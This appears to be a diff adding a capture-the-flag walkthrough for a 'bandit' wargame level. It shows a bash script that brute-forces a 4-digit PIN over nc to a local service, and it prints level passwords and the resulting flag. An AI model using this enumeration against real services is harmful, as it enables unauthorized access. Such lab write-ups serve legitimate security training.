@@ -1,0 +1,20 @@
+In this level we have to submit the current level password and a unknown 4 digit pincode to port 300002 to get the next password
+We can do this easily with a bash script
+So, in our tmp directory we make the following file:
+touch exploit.sh
+
+#!/bin/bash                                                                                              
+bandit24_pass="UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
+for i in {1000..9999}
+do
+	echo "$bandit24_pass $i" >> pass.txt
+done
+cat pass.txt | nc localhost 30002 >> output
+
+now we make sure this script is executable
+chmod +x exploit.sh
+Running it will give us a file output that is full of responses from the server
+Since there is only one instance where the server accepts our input we can use uniq to get that line
+cat output | uniq -u
+This yields our flag
+uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
